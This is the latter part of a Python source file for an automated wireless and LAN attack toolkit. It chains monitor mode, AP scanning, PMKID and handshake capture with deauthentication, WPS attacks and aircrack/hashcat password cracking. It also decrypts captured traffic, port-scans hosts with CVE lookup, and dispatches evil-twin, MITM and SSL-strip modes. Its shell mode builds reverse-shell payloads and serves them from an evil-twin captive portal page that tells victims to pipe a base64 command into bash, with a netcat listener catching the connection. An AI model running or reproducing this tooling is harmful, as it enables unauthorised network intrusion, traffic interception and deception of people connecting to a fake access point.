                if len(parts) == 2 and parts[1].strip():
                    key = parts[1].strip()
                    break
        return _ok(key_found=key is not None, key=key, output=r.stdout[-500:])
    except subprocess.TimeoutExpired:
        return _ok(key_found=False, note="hashcat timed out")
    except Exception as e:
        return _err(str(e))


def _crack_airolib(cap_file: str, db: str, bssid: str, essid: str) -> Dict:
    ok, _ = _have("aircrack-ng", "airolib-ng")
    if not ok:
        return _err("aircrack-ng and airolib-ng required")
    if not os.path.exists(db):
        return _err(f"airolib database not found: {db}")
    cmd = ["aircrack-ng", cap_file, "-r", db]
    if bssid:
        cmd += ["-b", bssid]
    if essid:
        cmd += ["-e", essid]
    try:
        r = _run(cmd, timeout=0x7FFFFFFF)
        out = r.stdout + r.stderr
        m = re.search(r'KEY FOUND!\s+\[\s*(.+?)\s*\]', out)
        key = m.group(1) if m else None
        return _ok(key_found=key is not None, key=key, method="airolib", output=out[-600:])
    except Exception as e:
        return _err(str(e))


def op_airolib_manage(db: str, action: str, essid: str = "",
                      wordlist: str = "") -> Dict:
    ok, _ = _have("airolib-ng")
    if not ok:
        return _err("airolib-ng not found")

    if action == "init":
        r = _run(["airolib-ng", db, "--init"], timeout=30)
        return _ok(output=r.stdout.strip())
    elif action == "import_essid":
        if not essid:
            return _err("essid required for import_essid")
        r = _run(["airolib-ng", db, "--import", "essid", essid], timeout=30)
        return _ok(output=r.stdout.strip())
    elif action == "import_passwd":
        if not wordlist or not os.path.exists(wordlist):
            return _err(f"wordlist not found: {wordlist}")
        r = _run(["airolib-ng", db, "--import", "passwd", wordlist], timeout=60)
        return _ok(output=r.stdout.strip())
    elif action == "batch":
        lines: List[str] = []
        stop = threading.Event()
        _stream_proc(["airolib-ng", db, "--batch"], 3600, lines, stop, "airolib")
        return _ok(lines=lines[-20:])
    elif action == "stats":
        r = _run(["airolib-ng", db, "--stats"], timeout=15)
        return _ok(output=r.stdout.strip())
    else:
        return _err("action must be: init, import_essid, import_passwd, batch, stats")


# ── Auto-crack pipeline ───────────────────────────────────────────────────────

def op_auto_crack(cap_file: str, wordlist: str = "", bssid: str = "",
                  essid: str = "", airolib_db: str = "") -> Dict:
    """Try every available cracking method in order: airolib → aircrack-ng → hashcat."""
    results = []

    # 1. airolib (fastest if DB has matching PMK)
    if airolib_db and os.path.exists(airolib_db):
        r = _crack_airolib(cap_file, airolib_db, bssid, essid)
        results.append({"method": "airolib", **r})
        if r.get("key_found"):
            return _ok(key=r["key"], method="airolib", attempts=results)

    # 2. aircrack-ng with wordlist
    if wordlist and os.path.exists(wordlist) and _TOOLS.get("aircrack-ng"):
        r = op_crack(cap_file, wordlist=wordlist, bssid=bssid, essid=essid)
        results.append({"method": "aircrack-ng", **r})
        if r.get("key_found"):
            return _ok(key=r["key"], method="aircrack-ng", attempts=results)

    # 3. hashcat (if hc22000 exists alongside)
    hc_file = re.sub(r'\.(cap|pcap|pcapng)$', '.hc22000', cap_file)
    if not os.path.exists(hc_file) and _TOOLS.get("hcxpcapngtool"):
        try:
            _run(["hcxpcapngtool", cap_file, "-o", hc_file], timeout=30)
        except Exception:
            pass
    if os.path.exists(hc_file) and wordlist and _TOOLS.get("hashcat"):
        r = _crack_hashcat(hc_file, wordlist)
        results.append({"method": "hashcat", **r})
        if r.get("key_found"):
            return _ok(key=r["key"], method="hashcat", attempts=results)

    return _ok(key_found=False, attempts=results,
               note="all methods exhausted — try a larger wordlist")


# ── Decrypt captured traffic ──────────────────────────────────────────────────

def op_decrypt(cap_file: str, key: str, bssid: str = "",
               out_dir: str = "", wep: bool = False) -> Dict:
    ok, _ = _have("airdecap-ng")
    if not ok:
        return _err("airdecap-ng not found (aircrack-ng suite)")
    if not cap_file or not os.path.exists(cap_file):
        return _err(f"capture file not found: {cap_file}")
    if not key:
        return _err("key (WPA passphrase or WEP hex key) required")

    save_dir = out_dir or _mk(str(WIFI_DIR / "decrypted"))
    out_file = os.path.join(save_dir, Path(cap_file).stem + "-dec.cap")

    if wep:
        cmd = ["airdecap-ng", "-w", key, cap_file, "-o", out_file]
    else:
        cmd = ["airdecap-ng", "-p", key, cap_file, "-o", out_file]
        if bssid:
            cmd += ["-b", bssid]

    try:
        r = _run(cmd, timeout=60)
        out = r.stdout + r.stderr
        packets = 0
        m = re.search(r'Total packets read\s+(\d+)', out)
        if m:
            packets = int(m.group(1))
        decrypted = 0
        m2 = re.search(r'Decrypted WPA packets\s+(\d+)|Decrypted WEP packets\s+(\d+)', out)
        if m2:
            decrypted = int(m2.group(1) or m2.group(2))
        return _ok(
            output_file=out_file if os.path.exists(out_file) else None,
            packets_read=packets, packets_decrypted=decrypted,
            output=out.strip(),
        )
    except Exception as e:
        return _err(str(e))


# ── Auto mode (wifite-style full automation) ──────────────────────────────────

def op_auto(iface: str, wordlist: str = "", scan_duration: int = 15,
            attack_timeout: int = 90, min_signal: int = -80,
            skip_wep: bool = False, skip_wps: bool = False,
            target_bssid: str = "", target_essid: str = "") -> Dict:
    """
    Full-auto attack pipeline:
      1. Ensure monitor mode
      2. Scan for APs
      3. Rank by signal / vulnerability
      4. For each target: PMKID → handshake capture → WPS (if enabled) → crack
    """
    report: Dict[str, Any] = {
        "interface": iface,
        "scan_duration": scan_duration,
        "targets_found": 0,
        "attacked": [],
        "cracked": [],
    }

    # Ensure monitor mode
    mon_r = op_monitor_on(iface)
    if not mon_r.get("success"):
        return _err(f"Could not enable monitor mode: {mon_r.get('error')}")
    mon_iface = mon_r.get("monitor_iface", iface)
    print(f"[auto] monitor interface: {mon_iface}", file=sys.stderr)

    # Scan
    print(f"[auto] scanning for {scan_duration}s...", file=sys.stderr)
    scan_r = op_wifi_scan(mon_iface, duration=scan_duration)
    aps = scan_r.get("access_points", [])

    # Filter
    targets = []
    for ap in aps:
        if target_bssid and ap["bssid"].upper() != target_bssid.upper():
            continue
        if target_essid and target_essid.lower() not in ap.get("essid", "").lower():
            continue
        if ap.get("signal_dbm", -100) < min_signal:
            continue
        enc = ap.get("encryption", "")
        if enc == "OPEN":
            continue
        targets.append(ap)

    report["targets_found"] = len(targets)
    print(f"[auto] {len(targets)} targets after filtering", file=sys.stderr)

    for ap in targets:
        bssid = ap["bssid"]
        essid = ap.get("essid", "")
        channel = ap.get("channel", "6").strip()
        enc = ap.get("encryption", "WPA2")
        entry: Dict[str, Any] = {
            "bssid": bssid, "essid": essid,
            "channel": channel, "encryption": enc,
            "attacks": [],
        }

        print(f"[auto] attacking {essid} ({bssid}) ch{channel} {enc}", file=sys.stderr)

        # WEP path
        if enc == "WEP" and not skip_wep:
            r = op_wep_attack(mon_iface, bssid, channel, duration=attack_timeout)
            entry["attacks"].append({"type": "wep", **r})
            if r.get("key_found"):
                entry["cracked"] = True
                entry["key"] = r.get("key")
                report["cracked"].append(entry)
                report["attacked"].append(entry)
                continue

        # PMKID (clientless, fast)
        pmkid_r = op_pmkid(mon_iface, bssid=bssid, duration=min(30, attack_timeout // 3))
        entry["attacks"].append({"type": "pmkid", **pmkid_r})
        if pmkid_r.get("hc22000_file") and wordlist:
            crack_r = op_auto_crack(
                pmkid_r["hc22000_file"], wordlist=wordlist, bssid=bssid, essid=essid
            )
            entry["attacks"].append({"type": "crack_pmkid", **crack_r})
            if crack_r.get("key_found"):
                entry["cracked"] = True
                entry["key"] = crack_r.get("key")
                report["cracked"].append(entry)
                report["attacked"].append(entry)
                continue

        # Handshake capture
        cap_r = op_capture(
            mon_iface, bssid=bssid, channel=channel,
            duration=attack_timeout, deauth=True, essid=essid
        )
        entry["attacks"].append({"type": "capture", **cap_r})
        if cap_r.get("capture_file") and wordlist:
            crack_r = op_auto_crack(
                cap_r["capture_file"], wordlist=wordlist, bssid=bssid, essid=essid
            )
            entry["attacks"].append({"type": "crack_handshake", **crack_r})
            if crack_r.get("key_found"):
                entry["cracked"] = True
                entry["key"] = crack_r.get("key")
                report["cracked"].append(entry)
                report["attacked"].append(entry)
                continue

        # WPS
        if not skip_wps:
            wps_r = op_wps_attack(
                mon_iface, bssid=bssid, channel=channel,
                pixiedust=True, timeout=min(attack_timeout, 120)
            )
            entry["attacks"].append({"type": "wps", **wps_r})
            if wps_r.get("cracked"):
                entry["cracked"] = True
                entry["key"] = wps_r.get("wpa_psk")
                report["cracked"].append(entry)

        report["attacked"].append(entry)

    report["success"] = True
    report["total_cracked"] = len(report["cracked"])
    return report


# ── Tool check ────────────────────────────────────────────────────────────────

def op_check_tools() -> Dict:
    groups = {
        "aircrack-ng suite": ["airmon-ng", "airodump-ng", "aireplay-ng",
                              "aircrack-ng", "airdecap-ng", "airolib-ng",
                              "packetforge-ng"],
        "wireless":          ["iw", "iwconfig"],
        "rogue ap":          ["hostapd", "dnsmasq"],
        "pmkid":             ["hcxdumptool", "hcxpcapngtool"],
        "wps":               ["reaver", "wash", "bully"],
        "mitm":              ["arpspoof", "bettercap", "tcpdump", "tshark"],
        "cracking":          ["hashcat", "john"],
    }
    report: Dict[str, Dict[str, str]] = {}
    for grp, tools in groups.items():
        report[grp] = {t: ("✓ found" if _TOOLS.get(t) else "✗ missing") for t in tools}
    return _ok(tools=report)


# ── LAN scan (original capability) ───────────────────────────────────────────

def _parse_ports(s: str) -> List[int]:
    s = (s or "").strip()
    if not s or s == "default":
        return [21, 22, 23, 25, 53, 80, 110, 143, 389, 443, 445,
                993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
                8080, 8443, 27017]
    ports = []
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            ports.extend(range(int(a), int(b) + 1))
        else:
            ports.append(int(part))
    return sorted(set(ports))


def _expand_cidr(target: str) -> List[str]:
    try:
        return [str(ip) for ip in ipaddress.ip_network(target, strict=False).hosts()]
    except ValueError:
        return [target]


def _arp_scan(cidr: str, timeout: float = 3.0) -> Dict[str, str]:
    if not HAS_SCAPY:
        return {}
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr)
        answered, _ = srp(pkt, timeout=timeout, verbose=False, retry=1)
        return {rcv.psrc: rcv.hwsrc for _, rcv in answered}
    except Exception:
        return {}


def _tcp_ping(ips: List[str], ports=(80, 443, 22, 445),
              timeout: float = 1.0) -> Set[str]:
    alive: Set[str] = set()
    lock = threading.Lock()

    def probe(ip: str):
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(timeout)
                if s.connect_ex((ip, port)) == 0:
                    with lock:
                        alive.add(ip)
                    s.close()
                    return
                s.close()
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=min(100, len(ips))) as ex:
        list(ex.map(probe, ips))
    return alive


_cve_cache: Dict[str, Any] = {}


async def _lookup_cves(session, keyword: str) -> List[str]:
    if not HAS_AIOHTTP or not keyword or len(keyword) < 3:
        return []
    cached = _cve_cache.get(keyword)
    if cached and datetime.now() - cached["ts"] < timedelta(hours=24):
        return cached["cves"]
    try:
        async with session.get(
            f"https://cve.circl.lu/api/search/{keyword}",
            timeout=aiohttp.ClientTimeout(total=4),
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, list):
                    cves = [item["id"] for item in data[:3] if "id" in item]
                    _cve_cache[keyword] = {"cves": cves, "ts": datetime.now()}
                    return cves
    except Exception:
        pass
    return []


def _banner_keyword(banner: str) -> str:
    if not banner or banner in ("N/A", "Open (Silent)"):
        return ""
    b = banner.lower()
    if b.startswith("ssh-"):
        return "openssh"
    if "server:" in b:
        prod = banner.split("|")[0].replace("Server:", "").strip()
        return prod.split("/")[0].split(" ")[0][:15]
    if "tls" in b and "alpn" in b:
        return "openssl"
    return ""


async def _probe_port(ip: str, port: int, hostname: str, session) -> Optional[Dict]:
    result = {"port": port, "status": "filtered",
               "service": "unknown", "banner": "N/A", "cves": []}
    try:
        result["service"] = socket.getservbyport(port, "tcp")
    except OSError:
        pass
    writer = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=2.0)
        result["status"] = "open"
        result["banner"] = "Open (Silent)"
        if port in (443, 8443):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port, ssl=ctx,
                                           server_hostname=hostname), timeout=3.0)
                writer.write(
                    f"GET / HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n".encode())
                await writer.drain()
                raw = (await asyncio.wait_for(reader.read(2048), timeout=2.0)
                       ).decode("utf-8", errors="ignore")
                srv = [l for l in raw.split("\r\n") if l.lower().startswith("server:")]
                result["banner"] = f"HTTPS | {srv[0].strip()}" if srv else "HTTPS"
                result["service"] = "https"
            except Exception:
                result["banner"] = "HTTPS (TLS)"
        elif port in (80, 8080):
            try:
                writer.write(
                    f"GET / HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n".encode())
                await writer.drain()
                raw = (await asyncio.wait_for(reader.read(2048), timeout=2.0)
                       ).decode("utf-8", errors="ignore")
                srv = [l for l in raw.split("\r\n") if l.lower().startswith("server:")]
                result["banner"] = srv[0].strip() if srv else "HTTP"
                result["service"] = "http"
            except Exception:
                result["banner"] = "HTTP"
        else:
            try:
                raw = (await asyncio.wait_for(reader.read(512), timeout=1.5)
                       ).decode("utf-8", errors="ignore").strip()
                if raw:
                    result["banner"] = raw.split("\n")[0][:150]
                    if raw.startswith("SSH-"):
                        result["service"] = "ssh"
            except asyncio.TimeoutError:
                pass
    except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
    if result["status"] == "open":
        kw = _banner_keyword(result["banner"])
        if kw and session:
            result["cves"] = await _lookup_cves(session, kw)
    return result


async def _scan_host(ip: str, ports: List[int], hostname: str,
                     concurrency: int = 100) -> List[Dict]:
    session = aiohttp.ClientSession() if HAS_AIOHTTP else None
    sem = asyncio.Semaphore(concurrency)

    async def bounded(port):
        async with sem:
            return await _probe_port(ip, port, hostname, session)

    done = await asyncio.gather(*[bounded(p) for p in ports], return_exceptions=True)
    if session:
        await session.close()
    return sorted([r for r in done if isinstance(r, dict)], key=lambda x: x["port"])


def _fingerprint(open_ports: List[Dict]) -> Dict:
    ports = {r["port"] for r in open_ports}
    banners = " ".join(r.get("banner", "") for r in open_ports).lower()
    info: Dict[str, Any] = {"device_type": "Unknown", "os": "Unknown", "risks": []}
    if {80, 443}.intersection(ports) and ("camera" in banners or "dvr" in banners):
        info["device_type"] = "IoT Camera/DVR"
        info["risks"].append("Exposed IoT device")
    elif {3306, 5432, 27017, 1433}.intersection(ports):
        info["device_type"] = "Database Server"
        info["risks"].append("Exposed database port")
    elif {80, 443}.issubset(ports):
        info["device_type"] = "Web Server"
    elif 22 in ports:
        info["device_type"] = "Linux Host"
    if 3389 in ports or 445 in ports:
        info["os"] = "Windows"
    elif 22 in ports or "ubuntu" in banners or "debian" in banners:
        info["os"] = "Linux/Unix"
    if 23 in ports:
        info["risks"].append("Telnet — cleartext")
    if 21 in ports:
        info["risks"].append("FTP — cleartext")
    if "openssh 4" in banners or "openssh 5" in banners:
        info["risks"].append("End-of-life SSH")
    return info


async def _lan_scan(context: Dict) -> Dict:
    target = context.get("target", "")
    params = context.get("params", {})
    if not target:
        return {"error": "target required"}
    ips = _expand_cidr(target)
    print(f"[*] Discovering {target} ({len(ips)} addrs)...", file=sys.stderr)
    arp_map = _arp_scan(target, timeout=float(params.get("timeout", 3.0))) if len(ips) > 1 else {}
    alive = set(arp_map)
    if not alive:
        alive = _tcp_ping(ips[:128], timeout=1.5)
    if not alive:
        alive = set(ips) if len(ips) == 1 else set()
    ports = _parse_ports(params.get("ports", "default"))
    hosts = []
    for ip in sorted(alive):
        entry: Dict[str, Any] = {
            "ip": ip, "mac": arp_map.get(ip, ""),
            "hostname": "", "open_ports": [], "fingerprint": {},
        }
        try:
            entry["hostname"] = socket.gethostbyaddr(ip)[0]
        except Exception:
            pass
        if _bool(params.get("port_scan", True)):
            print(f"[*] Scanning {ip}...", file=sys.stderr)
            op = await _scan_host(ip, ports, entry["hostname"] or ip,
                                  int(params.get("concurrency", 100)))
            entry["open_ports"] = op
            entry["fingerprint"] = _fingerprint(op)
        hosts.append(entry)
    threats = []
    db_hosts = [h["ip"] for h in hosts
                if any(p["port"] in (3306, 5432, 27017, 6379, 1433)
                       for p in h.get("open_ports", []))]
    if db_hosts:
        threats.append(f"Exposed DB on: {', '.join(db_hosts)}")
    total_open = sum(len(h["open_ports"]) for h in hosts)
    all_cves = [c for h in hosts for p in h["open_ports"] for c in p.get("cves", [])]
    return {
        "target": target, "scan_time": datetime.now().isoformat(),
        "hosts": hosts, "threats": threats,
        "summary": {
            "hosts_found": len(hosts),
            "total_open_ports": total_open,
            "threats_detected": len(threats),
            "unique_cves": len(set(all_cves)),
            "cve_list": list(set(all_cves)),
        },
    }


# ── Shell handler ─────────────────────────────────────────────────────────────

def op_shell(iface: str = "", lhost: str = "", lport: int = 4444,
             serve: bool = True, duration: int = 60,
             payload_type: str = "all",
             deliver_via_evil_twin: bool = False,
             essid: str = "FreeWiFi", channel: str = "6") -> Dict:
    """
    OnlyShell handler with optional delivery via evil-twin captive portal.
    deliver_via_evil_twin=True: run evil-twin + serve a download page with the payload,
    then start the handler to catch incoming shells.
    """
    lhost = lhost or _local_ip()
    rs = _rs()
    if rs is None:
        return _err("revshell module not found — check tools/network/revshell/")
    gen = rs.op_generate(lhost=lhost, lport=lport, shell=payload_type)
    if not gen.get('success'):
        return _err(f"payload gen failed: {gen.get('error')}")
    payloads = gen.get('payloads', {})

    result = {
        'lhost': lhost, 'lport': lport,
        'payload_count': len(payloads),
        'payloads': payloads,
        'listener': f"nc -lvnp {lport}",
    }

    if deliver_via_evil_twin and iface:
        # Serve the bash_tcp one-liner in the captive portal download page
        bash_payload = payloads.get('bash_tcp', payloads.get('bash_mkfifo', ''))
        if bash_payload:
            import base64 as _b64
            encoded = _b64.b64encode(bash_payload.encode()).decode()
            # Fork evil-twin in background thread, serve payload script
            def _run_twin():
                try:
                    import http.server, urllib.parse as _up
                    _html = (
                        f"<!DOCTYPE html><html><head><title>Connect</title></head><body>"
                        f"<h2>Run this to connect:</h2>"
                        f"<pre>echo {encoded}|base64 -d|bash</pre>"
                        f"<p>Or: <a href='/payload.sh'>Download shell.sh</a></p></body></html>"
                    )
                    class _H(http.server.BaseHTTPRequestHandler):
                        def log_message(self, *a): pass
                        def do_GET(self):
                            if self.path == '/payload.sh':
                                self.send_response(200)
                                self.send_header('Content-Type', 'text/plain')
                                self.end_headers()
                                self.wfile.write(bash_payload.encode())
                            else:
                                self.send_response(200)
                                self.send_header('Content-Type', 'text/html')
                                self.end_headers()
                                self.wfile.write(_html.encode())
                    http.server.HTTPServer(('0.0.0.0', 8080), _H).serve_forever()
                except Exception:
                    pass
            threading.Thread(target=_run_twin, daemon=True).start()
            result['evil_twin_delivery'] = f"payload served at http://{lhost}:8080/payload.sh"
            result['evil_twin_essid'] = essid

    result['success'] = True
    if serve:
        rs.op_serve([lport], lhost=lhost)
    else:
        r = rs.op_listen([lport], duration=duration, lhost=lhost)
        result.update({'sessions': r.get('sessions', []),
                       'sessions_count': r.get('sessions_count', 0)})
    return result


# ── Dispatcher ────────────────────────────────────────────────────────────────

def dispatch(context: Dict) -> Any:
    params = context.get("params", {})
    mode = params.get("mode", "scan").lower()
    iface = params.get("iface", context.get("target", ""))

    if mode == "check_tools":
        return op_check_tools()

    if mode in ("scan", "discover"):
        params["port_scan"] = mode == "scan"
        return asyncio.run(_lan_scan(context))

    if mode == "auto":
        return op_auto(
            iface,
            wordlist=params.get("wordlist", ""),
            scan_duration=int(params.get("scan_duration", 15)),
            attack_timeout=int(params.get("attack_timeout", 90)),
            min_signal=int(params.get("min_signal", -80)),
            skip_wep=_bool(params.get("skip_wep", False)),
            skip_wps=_bool(params.get("skip_wps", False)),
            target_bssid=params.get("bssid", ""),
            target_essid=params.get("essid", ""),
        )

    if mode == "monitor_on":
        return op_monitor_on(iface)

    if mode == "monitor_off":
        return op_monitor_off(iface)

    if mode == "inject_test":
        return op_inject_test(iface)

    if mode == "wifi_scan":
        return op_wifi_scan(
            iface, duration=int(params.get("duration", 15)),
            channel=str(params.get("channel", "")),
            band=params.get("band", "bg"),
        )

    if mode == "deauth":
        return op_deauth(
            iface, bssid=params.get("bssid", ""),
            client=params.get("client_mac", "FF:FF:FF:FF:FF:FF"),
            count=int(params.get("deauth_count", 10)),
            channel=str(params.get("channel", "")),
            interval=float(params.get("interval", 0.0)),
        )

    if mode == "capture":
        return op_capture(
            iface, bssid=params.get("bssid", ""),
            channel=str(params.get("channel", "")),
            out_dir=params.get("out_dir", ""),
            duration=int(params.get("duration", 60)),
            deauth=_bool(params.get("deauth", True)),
            deauth_count=int(params.get("deauth_count", 5)),
            client=params.get("client_mac", "FF:FF:FF:FF:FF:FF"),
            essid=params.get("essid", ""),
        )

    if mode == "handshake_check":
        return op_handshake_check(
            params.get("capture_file", context.get("target", "")),
            bssid=params.get("bssid", ""),
            essid=params.get("essid", ""),
        )

    if mode == "wep_attack":
        return op_wep_attack(
            iface, bssid=params.get("bssid", ""),
            channel=str(params.get("channel", "")),
            client_mac=params.get("client_mac", ""),
            method=params.get("wep_method", "arp_replay"),
            out_dir=params.get("out_dir", ""),
            duration=int(params.get("duration", 300)),
        )

    if mode == "forge_packet":
        return op_forge_packet(
            iface, bssid=params.get("bssid", ""),
            dmac=params.get("dmac", "FF:FF:FF:FF:FF:FF"),
            smac=params.get("smac", ""),
            arp_ip=params.get("arp_ip", "255.255.255.255"),
            repeat=int(params.get("repeat", 1000)),
            cap_file=params.get("xor_file", ""),
        )

    if mode == "evil_twin":
        return op_evil_twin(
            iface,
            essid=params.get("essid", "FreeWiFi"),
            channel=str(params.get("channel", "6")),
            password=params.get("password", ""),
            with_dhcp=_bool(params.get("with_dhcp", True)),
            ap_ip=params.get("ap_ip", "10.0.0.1"),
            duration=int(params.get("duration", 120)),
            captive_portal=_bool(params.get("captive_portal", False)),
            captive_port=int(params.get("captive_port", 8080)),
        )

    if mode == "mitm":
        return op_mitm(
            iface, victim=params.get("victim", ""),
            gateway=params.get("gateway", ""),
            duration=int(params.get("duration", 60)),
            capture=_bool(params.get("capture", True)),
            strip_ssl=_bool(params.get("strip_ssl", False)),
        )

    if mode == "wps_scan":
        return op_wps_scan(
            iface, channel=str(params.get("channel", "")),
            duration=int(params.get("duration", 30)),
        )

    if mode == "wps_attack":
        return op_wps_attack(
            iface, bssid=params.get("bssid", ""),
            channel=str(params.get("channel", "")),
            pixiedust=_bool(params.get("pixiedust", True)),
            pin=params.get("wps_pin", ""),
            timeout=int(params.get("timeout", 3600)),
        )

    if mode == "pmkid":
        return op_pmkid(
            iface, bssid=params.get("bssid", ""),
            duration=int(params.get("duration", 60)),
            out_dir=params.get("out_dir", ""),
        )

    if mode == "crack":
        return op_crack(
            cap_file=params.get("capture_file", context.get("target", "")),
            wordlist=params.get("wordlist", ""),
            bssid=params.get("bssid", ""),
            essid=params.get("essid", ""),
            use_hashcat=_bool(params.get("use_hashcat", False)),
            airolib_db=params.get("airolib_db", ""),
            rules=params.get("hashcat_rules", ""),
        )

    if mode == "auto_crack":
        return op_auto_crack(
            cap_file=params.get("capture_file", context.get("target", "")),
            wordlist=params.get("wordlist", ""),
            bssid=params.get("bssid", ""),
            essid=params.get("essid", ""),
            airolib_db=params.get("airolib_db", ""),
        )

    if mode == "decrypt":
        return op_decrypt(
            cap_file=params.get("capture_file", context.get("target", "")),
            key=params.get("key", ""),
            bssid=params.get("bssid", ""),
            out_dir=params.get("out_dir", ""),
            wep=_bool(params.get("wep", False)),
        )

    if mode == "airolib":
        return op_airolib_manage(
            db=params.get("airolib_db", context.get("target", "")),
            action=params.get("action", "stats"),
            essid=params.get("essid", ""),
            wordlist=params.get("wordlist", ""),
        )

    if mode == "shell":
        return op_shell(
            iface=iface,
            lhost=params.get("lhost", ""),
            lport=int(params.get("lport", 4444)),
            serve=_bool(params.get("serve", True)),
            duration=int(params.get("duration", 60)),
            payload_type=params.get("payload_type", "all"),
            deliver_via_evil_twin=_bool(params.get("deliver_via_evil_twin", False)),
            essid=params.get("essid", "FreeWiFi"),
            channel=str(params.get("channel", "6")),
        )

    return _err(
        f"Unknown mode '{mode}'. Valid modes: auto, monitor_on, monitor_off, "
        "inject_test, wifi_scan, capture, handshake_check, deauth, evil_twin, "
        "mitm, wps_scan, wps_attack, pmkid, wep_attack, crack, auto_crack, "
        "decrypt, forge_packet, airolib, shell, scan, discover, check_tools"
    )


def main():
    raw = sys.stdin.read()
    try:
        context = json.loads(raw)
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON: {e}"}))
        sys.exit(1)
    print(json.dumps(dispatch(context), indent=2, default=str))


if __name__ == "__main__":
    main()
